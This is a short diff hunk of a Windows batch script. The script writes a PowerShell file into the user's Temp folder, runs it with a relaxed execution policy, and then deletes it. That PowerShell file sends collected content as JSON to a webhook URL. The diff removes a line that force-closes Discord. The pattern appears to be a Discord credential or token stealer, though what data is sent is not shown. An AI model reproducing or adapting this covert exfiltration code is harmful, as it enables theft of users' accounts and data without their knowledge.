@@ -58,6 +58,5 @@ echo. >>%userprofile%\AppData\Local\Temp\bnt.ps1
 echo $JSON = @{ "content"= $content;}^| convertto-json >>%userprofile%\AppData\Local\Temp\bnt.ps1
 echo Invoke-WebRequest -uri $hook -Method POST -Body $JSON -Headers @{"Content-Type" = "application/json"} >>%userprofile%\AppData\Local\Temp\bnt.ps1
 Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\bnt.ps1
-taskkill /im discord.exe /f 
 :e
 del %userprofile%\AppData\Local\Temp\bnt.ps1 
